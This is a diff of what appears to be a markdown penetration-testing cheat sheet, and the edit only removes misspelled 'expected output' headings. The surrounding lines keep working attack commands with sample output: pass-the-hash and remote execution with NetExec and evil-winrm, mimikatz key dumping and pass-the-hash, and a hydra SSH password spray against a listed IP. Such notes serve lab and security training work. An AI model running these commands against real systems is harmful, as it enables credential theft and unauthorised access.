@@ -4001,9 +4001,6 @@ NetExec is a powerful post-exploitation tool designed to automate security testi
 ```bash
 netexec smb 172.16.1.0/24 -u Administrator -d . -H <HASH>
 ```
-
-**Expcted output**
-
 ```bash
 # SMB         <DOMAIN_IP_1>   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:.) (signing:True) (SMBv1:False)
 # SMB         <DOMAIN_IP_1>   445    DC01             [-] .\Administrator:<HASH> STATUS_LOGON_FAILURE 
@@ -4019,9 +4016,6 @@ We can use the option -x to execute commands.
 ```bash
 netexec smb <IP> -u Administrator -d . -H <HASH> -x whoami
 ```
-
-**Expcted output**
-
 ```bash
 # SMB         <IP>  445    MS01            [*] Windows 10 Enterprise 10240 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:True)
 # SMB         <IP>  445    MS01            [+] .\Administrator <HASH> (Pwn3d!)
@@ -4049,9 +4043,6 @@ As long as the account belongs to Remote Management Users or equivalent, you can
 ```bash
 evil-winrm -i <IP> -u <USER> -H <HASH>
 ```
-
-**Expcted output**
-
 ```bash
 # Evil-WinRM shell v3.3
 
@@ -4231,9 +4222,6 @@ mimikatz.exe
 mimikatz # privilege::debug
 mimikatz # sekurlsa::ekeys
 ```
-
-**Expcted Output**
-
 ```cmd
 Authentication Id : 0 ; 444066 (00000000:0006c6a2)
 Session           : Interactive from 1
@@ -4274,9 +4262,6 @@ mimikatz.exe
 mimikatz # privilege::debug
 mimikatz # sekurlsa::pth /domain:<corp.rth> /user:<USER> /ntlm:<NTLM_HASH>
 ```
-
-**Expcted Output**
-
 ```cmd
 user    : <USER>
 domain  : <corp.rth>
@@ -6158,9 +6143,6 @@ cat ~/usernames.txt
 ```bash
 hydra -L ~/usernames.txt -p 'Texas123!@#' ssh://10.129.234.116
 ```
-
-**Success Output:**
-
 ```bash
 # [22][ssh] host: 10.129.234.116   login: jbetty   password: Texas123!@#
 ```
@@ -6261,9 +6243,6 @@ During the SMB share download, several backup files were retrieved that may cont
 ```bash
 ls HR/Archive/
 ```
-
-**Expectd Output:**
-
 ```bash
 # ...
 #  Employee-Passwords_OLD_011.ibak
